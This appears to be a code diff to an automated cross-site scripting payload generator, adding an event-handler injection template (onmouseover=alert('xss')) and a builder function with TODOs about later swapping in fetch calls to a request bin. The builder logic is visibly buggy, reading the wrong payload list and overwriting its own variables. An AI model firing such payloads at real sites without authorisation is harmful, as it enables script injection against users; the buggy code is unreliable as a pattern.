@@ -45,6 +45,12 @@ BASE_PAYLOADS = {
             "payload": """'>HTML_PAYLOADTAG_TO_ESCAPE""",
             "used_chars": ["'", '/', '>', '<']
         }
+    ],
+    "INJECT_EVENT": [
+        {
+            "payload": """'onmouseover=FUNCTION(`ARGS`)""",
+            "used_chars": ["'", "=", "`", "(", ")" , "FUNCTION", "ARGS"]
+        },
     ]
 }
 
@@ -251,6 +257,39 @@ def build_ESCAPE_HTML_payload(requestModel: RequestModel, filterModel: FilterMod
 
 
 
+def build_INJECT_EVENT_payload(requestModel: RequestModel, filterModel: FilterModel, lastTestedPayload: Payload | None, failedData: list) -> Payload | None:
+    """
+    Builds payloads for the INJECT_EVENT attack type
+    """
+    # TODO: be able to choose ALERT or REQUEST_BIN in the building process
+
+    payloadType = PayloadType.ALERT # TODO: change this
+
+    if len(failedData) == 0:
+        # take the first payload which has the expected escape char
+        for base_payload in BASE_PAYLOADS["ESCAPE_JS"]: 
+            if base_payload['used_chars'][0] == requestModel.escapeChar: payload = base_payload;break
+
+        payload_str = f"{TEST_INPUT}{payload['payload']}EOP"
+
+        # TODO: mettre toutes les fonctions equivalentes au alert, puis au fetch, 
+        payload_str = payload_str.replace("FUNCTION", "alert")
+        usedCharsReplaced = payload['used_chars'].copy()
+        replace_list_element(usedCharsReplaced, 'FUNCTION', 'alert')
+
+        # TODO: mettre les arguments en fonction du type alert ou request bin
+        payload_str = payload_str.replace("ARGS", "xss")
+        replace_list_element(usedCharsReplaced, 'ARGS', 'xss')
+
+        payload_str = payload_str.replace("EVENT", "alert")
+        usedCharsReplaced = payload['used_chars'].copy()
+        replace_list_element(usedCharsReplaced, 'FUNCTION', 'alert')
+
+        return Payload(value=payload_str, payloadType=payloadType, usedChars=payload['used_chars'], usedCharsReplaced=usedCharsReplaced, referredIndex=0)
+
+    return update_payload_with_failed_data(lastTestedPayload, failedData, requestModel.escapeChar)
+
+
 def get_payload_generator(attackType: AttackType) -> callable:
     """
     Returns the payload generator for the given attack type
@@ -265,5 +304,4 @@ def get_payload_generator(attackType: AttackType) -> callable:
         return build_ESCAPE_HTML_payload
     
     elif attackType == AttackType.INJECT_EVENT:
-        raise NotImplementedError(f"{attackType} not implemented yet") # build_INJECT_EVENT_payload
-    
+        return build_INJECT_EVENT_payload
